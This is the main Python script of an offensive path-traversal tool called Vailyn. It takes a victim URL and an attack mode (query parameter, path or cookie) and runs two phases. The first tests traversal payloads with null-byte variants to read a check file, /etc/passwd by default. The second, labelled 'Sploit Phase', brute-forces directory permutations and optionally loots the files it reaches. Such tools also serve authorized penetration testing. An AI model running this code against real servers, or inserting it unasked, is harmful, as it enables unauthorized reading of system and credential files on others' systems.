#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;    
    , ;   
     .   
           
       .    
     .;.    
     .;  
      :  
      ,   
       

┌─[pathtrav]─[~]
└──╼ VainlyStrain
"""


import treelib, argparse
import requests, sys
import random, string
import subprocess
import time
import os

from itertools import permutations
from multiprocessing.pool import ThreadPool as Pool

from core.methods.parser import build_parser
from core.methods.print import banner
from core.methods.list import listsplit
from core.methods.select import select
from core.methods.tree import create_tree
from core.methods.attack import phase1, phase2
from core.methods.cookie import readCookie
from core.methods.cache import load, save, parseUrl

from core.colors import color
from core.variables import payloadlist, nullchars, version, sdirs, commons, processes, cachedir


filetree = treelib.Tree()
filetree.create_node(color.O+"/"+color.END+color.RD, "root")

def main() -> int:    
    banner()
    parser = build_parser()
    opt = vars(parser.parse_args())
    args = parser.parse_args()
    if not (opt["lists"] and opt["victim"] and opt["attack"]):
        parser.print_usage()
        sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -v, -a and -l mandatory')
    #load dictionaries
    if opt['lists']:
        with open(args.lists[0]) as filelisted:
            for l in filelisted:
                commons.append(l.strip())
        with open(args.lists[1]) as dirlisted:
            for l in dirlisted:
                sdirs.append(l.strip())
  
    loot = False
    victim2 = ""
    depth = 2
    verbose = False
    foundfiles = [""]
    foundurls = [""]
    foundpayloads = []
    foundnullbytes = []
    vlnfile = "/etc/passwd"
    checkdepth = 8
    cookiefile = ""

    if opt["loot"]:
        loot = True

    if opt["vic2"]:
        victim2 = args.vic2

    if opt["depths"]:
        checkdepth = args.depths[0]
        depth = args.depths[1]

    if opt["all"]:
        verbose = True

    if opt["check"]:
        vlnfile = args.check

    if opt["cookie"]:
        cookiefile = args.cookie
    
    param = ""
    cookie = None
    selected = ""

    iter=1
    ndirs=list.copy(sdirs)
    del ndirs[0]
    mdirs=[]
    while (iter<=(depth)):
        mdirs += permutations(ndirs,(iter+1))
        iter+=1
    for elem in mdirs:
        diri=''.join(elem)
        sdirs.append(diri)
    splitted = listsplit(sdirs, round(len(sdirs)/processes))
    paysplit = listsplit(payloadlist, round(len(payloadlist)/processes))
    if (args.attack == 1):
        if not opt["param"]:
            parser.print_usage()
            sys.exit("\n"+color.R+'[-]'+color.END+color.BOLD+' Invalid/missing '
                'params'+color.END+'\n'+color.RD+'[HINT]'+color.END+' -p mandatory for -a 1')
        print("{}Vailyn: {}PARAM{}".format(color.RC, color.END+color.RB, color.END))
        param = args.param
    elif (args.attack == 2):
        if not args.victim.endswith("/"):
            args.victim = args.victim + "/"
        print("{}Vailyn: {}PATH{}".format(color.RC, color.END+color.RB, color.END))
    elif (args.attack == 3):
        print("{}Vailyn: {}COOKIE{}".format(color.RC, color.END+color.RB, color.END))

    print("    v" + version)
    time.sleep(0.5)

    if args.attack == 3:
        print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Parsing Cookie\n'.format(color.RD, color.END))
        cookie, selected = readCookie(args.victim)

    print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Analysis Phase\n'.format(color.RD, color.END))
        
    vlnysis = True
    targetcache = parseUrl(args.victim)
    if os.path.exists(cachedir+targetcache+"payloads.cache") and os.path.exists(cachedir+targetcache+"nullbytes.cache"):
        choice = input("{0}[!]{1} Detected Payload cache from previous attack.\n{0}[?]{1} Do you want to load the cache and skip Phase 1? (enter if not) :> ".format(color.RD, color.END))
        if choice != "":
            vlnysis = False
            foundpayloads, foundnullbytes = load(targetcache)
        else:
            print()

    if vlnysis:
        print("{0}[+]{1} Loaded {2}{3}{1} payloads.\n".format(color.RD, color.END, color.BOLD, len(payloadlist)*len(nullchars)))
        starting_time = time.time()
        with Pool(processes=processes) as pool:
            res = [pool.apply_async(phase1, args=(args.attack,args.victim,victim2,param,cookie,selected,verbose,checkdepth,l,vlnfile,cookiefile,)) for l in paysplit]
            for i in res:
                tuples = i.get()
                foundpayloads += tuples[0]
                foundnullbytes += tuples[1]
            
        ending_time = time.time()
        vuln_time = ending_time - starting_time
        save(targetcache, foundpayloads, foundnullbytes)
    else:
        vuln_time = 0.0
                
    attack = False
    if foundpayloads:
        attack = True
        selectedpayloads = select(foundpayloads)
        if foundnullbytes:
            selectednullbytes = select(foundnullbytes, nullbytes=True)
        else:
            selectednullbytes = []
    else:
        cont = input("[!] No payload succeeded. Attack anyways? (enter if not) :> ")
        if cont != "":
            attack = True
            selectedpayloads = payloadlist
            selectednullbytes = nullchars
    #start the attack
    starting_time = time.time()
    if attack:
        print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Sploit Phase\n'.format(color.RD, color.END))
        with Pool(processes=processes) as pool:
            res = [pool.apply_async(phase2, args=(args.attack,args.victim,victim2,param,cookie,selected,commons,l,depth,verbose,loot,selectedpayloads,selectednullbytes,cookiefile,)) for l in splitted]
            for i in res:
                restuple = i.get()
                foundfiles += restuple[0]
                foundurls += restuple[1]

                    
    ending_time = time.time()
    attack_time = ending_time - starting_time
    total_time = vuln_time + attack_time
    print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Directory Tree\n'.format(color.RD, color.END))
    if foundfiles:
        create_tree(filetree, foundfiles)
        filetree.show()
    if not foundurls:
        print("nothing found")
    print("{}Scan completed in {}s.{}".format(color.RC, total_time, color.END))


if __name__ == "__main__":
    try:
       main()
    except KeyboardInterrupt:
        print('\nInterrvpted.\n')
